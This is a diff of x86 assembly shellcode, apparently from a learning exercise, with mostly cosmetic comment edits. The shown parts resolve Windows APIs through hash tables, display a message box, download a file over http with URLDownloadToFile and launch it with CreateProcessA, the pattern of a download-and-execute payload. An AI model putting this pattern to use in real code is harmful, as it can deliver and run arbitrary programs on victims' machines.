@@ -68,7 +68,7 @@ pop ebp
 
 ; call messageboxa
 ; says "Downloading Flower Image Now"
-push 0x00 ; null byte for hi
+push 0x00 ; null byte
 push 0x776f4e20 ; pushing above sentence backwords
 push 0x6567616d
 push 0x49207265
@@ -86,7 +86,6 @@ call [EDX + MESSAGEBOXA]
 mov edx, ebx ; Moved back to be consistent
 
 ; call URLDownloadToFile, Downloads Flower Image over http
-
 lea esi, [EDX + URL]
 lea edi, [EDX + URLFILENAME]
 push 0x00 ; push lpfnCB
@@ -137,7 +136,7 @@ call [edx + CreateProcessA]
 mov edx, ebx ; replacing edx
 
 ; Call Exit Process
-push 0x00
+push 0x00 ; Error code
 call [edx + ExitProcess]
 
 
@@ -251,7 +250,6 @@ KERNEL32HASHTABLE:
 	dd 0x95902b19 ; ExitProcess
 	dd 0xc8ac8026 ; LoadLibraryA
 	
-	; dd 0xe8bf6dad  ; WinExec
 	dd 0xFFFF ; make sure to end with this token
 
 KERNEL32FUNCTIONSTABLE:
@@ -261,11 +259,10 @@ ExitProcess:
 	dd 0x00000001
 LoadLibraryA:
 	dd 0x00000002
-; WinExec:
-; 	dd 0x00000002
+
 
 USER32HASHTABLE:
-	dd 0xabbc680d ; messageboxa
+	dd 0xabbc680d ; MessageBoxA
 	dd 0xFFFF
 
 USER32FUNCTIONSTABLE:
